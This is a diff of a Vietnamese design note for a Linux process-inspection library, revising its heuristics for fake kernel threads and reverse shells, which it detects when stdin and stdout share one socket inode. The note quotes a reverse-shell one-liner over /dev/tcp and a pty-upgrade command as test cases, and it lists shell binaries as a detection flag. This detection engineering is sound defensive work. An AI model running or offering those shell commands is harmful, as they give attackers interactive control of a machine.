@@ -447,7 +447,7 @@ có packer build được.
 | cờ | ý nghĩa | chi phí |
 |---|---|---|
 | `KOFA_PF_EXE_UNLINKED` | exe `(deleted)` **và** path không còn -> tự xoá sau khi chạy | 1 `access()`, chỉ cho process có cờ deleted |
-| `KOFA_PF_FAKE_KTHREAD` | comm dạng `[x]` nhưng **không** có `PF_KTHREAD` | 0 — đã đọc `stat` rồi |
+| `KOFA_PF_FAKE_KTHREAD` | comm dạng `[x]`, **không** có `PF_KTHREAD`, **và** exe resolve ra path tuyệt đối | 0 — đã đọc `stat` rồi |
 | `KOFA_PF_STDIO_SOCKET` | fd 0/1/2 là socket | 3 `readlink` |
 | `cmdline` | `/proc/pid/cmdline`, NUL -> space | 1 open + 1 read |
 | `n_fd` / `n_socket` | đếm fd và fd socket | 1 readdir + n readlinkat |
@@ -459,24 +459,56 @@ này phân loại kernel thread bằng `PF_KTHREAD` (trường 9 của `stat` �
 chính kernel) chứ **không bao giờ** bằng tên. Nên bất đồng giữa tên process tự
 đặt và điều kernel nói là rơi ra sẵn, và không có cách viết tên nào né được.
 
-### Reverse shell: cờ đơn lẻ KHÔNG đủ, tỉ lệ mới là tín hiệu
+### Reverse shell — CÙNG MỘT SOCKET, không phải "cả hai đều là socket"
 
-Đo trên desktop này — 8 process mang `STDIO_SOCKET` lúc nghỉ, **tất cả đều hợp
-lệ** (language server của VS Code, extension host, agent của chính cây này).
-Thử có kiểm soát `bash -i >& /dev/tcp/127.0.0.1/48231 0>&1`:
+Phiên bản đầu của tôi ("fd 0/1/2 bất kỳ cái nào là socket") có **8 FP** trên
+desktop sạch. Sai. Điều kiện đúng là stdin và stdout trỏ tới **CÙNG một
+socket**, so bằng inode kernel ghi trong link.
+
+Đo trên máy này:
 
 ```
-8 cái hợp lệ   : 23..94 fd,  5..14 là socket   (tỉ lệ 0.10–0.33)
-reverse shell  :     4 fd,      4 là socket    (tỉ lệ 1.00, cmd "bash -i")
+8 cái hợp lệ (LSP, extension host, agent):
+   stdin socket:[14376315]  stdout socket:[14376317]
+   stdin socket:[14382089]  stdout socket:[14382091]
+   stdin socket:[14362326]  stdout socket:[14362328]   ... luôn là CẶP KHÁC NHAU
+
+reverse shell `bash -i >& /dev/tcp/...`:
+   stdin socket:[14899490]  stdout socket:[14899490]   <- CÙNG INODE
 ```
 
-Chương trình thật giữ một tập fd làm việc — file, epoll, pipe, terminal — và
-socket chỉ là một phần. Shell được đưa socket làm stdio **không giữ gì khác**.
-Đó là lý do `n_fd`/`n_socket` được thu cùng cờ chứ không thu mỗi cờ.
+`>&` dup **một** socket sang cả hai đầu vì chỉ có **một** kết nối. Process được
+spawn bình thường có **socketpair** — hai object, hai inode, mỗi chiều một cái.
 
-Việc **ghép** vẫn là của caller: thư viện nói fd là gì, `comm`/`cmdline` nói
-chương trình là gì, không có chỗ nào ở đây quyết định tỉ lệ nhỏ + shell = độc.
-Entry point của container cũng là shell với 4 fd.
+Quét toàn máy `stdin == stdout == socket`: **đúng 1 process, là reverse shell.**
+8 FP -> **0**, đổi lấy một phép so chuỗi.
+
+| cờ | ý nghĩa | FP trên desktop sạch |
+|---|---|---|
+| `KOFA_PF_STDIO_SOCKET` | bất kỳ fd 0/1/2 là socket | **8** — gần như vô dụng |
+| `KOFA_PF_STDIO_SAME_SOCKET` | stdin **và** stdout cùng một socket | **0** |
+| `KOFA_PF_SHELL` | exe là sh/bash/dash/zsh/ksh/ash/busybox/fish/csh/tcsh/mksh | nhiều, chỉ là nửa thứ hai |
+
+`fd_stdin` / `fd_stdout` / `fd_stderr` được trả về **nguyên văn** bên cạnh cờ,
+theo cùng lý do `kofa_region` giữ `path` cạnh phân loại: cờ là quyết định có
+thể sai, chuỗi thô là thứ duy nhất cho phép kiểm chứng.
+
+### `KOFA_PF_STDIO_SAME_TTY` — đã thu, nhưng CẨN THẬN
+
+Clause thứ hai trong rule cũ (`fd 0 == fd 1 == fd 2 == /dev/pts/N`) đã được thu
+thành cờ riêng, **nhưng một mình nó không phải tín hiệu**: đó chính xác là hình
+dạng của **mọi** interactive shell trong **mọi** cửa sổ terminal — đó là định
+nghĩa của terminal.
+
+Nó bắt reverse shell **đã được nâng lên pty** (`python -c 'import pty;
+pty.spawn("/bin/bash")'`). Thứ phân biệt hai trường hợp **không nằm ở fd**: đó
+là **AI GIỮ ĐẦU KIA**. Login thật thì terminal emulator hoặc sshd giữ master
+side; shell đã nâng cấp thì là thứ attacker chạy. Muốn dùng clause này phải đi
+duyệt fd của process khác — việc của caller, không phải của cờ này.
+
+**Cần bạn xác nhận**: rule cũ có thêm điều kiện nào cho nhánh pts không (parent
+process? không có controlling terminal?), hay nó vốn chỉ dùng khi đã có tín
+hiệu khác?
 
 ### Chưa làm — heur so runtime với file trên đĩa (packed?)
 
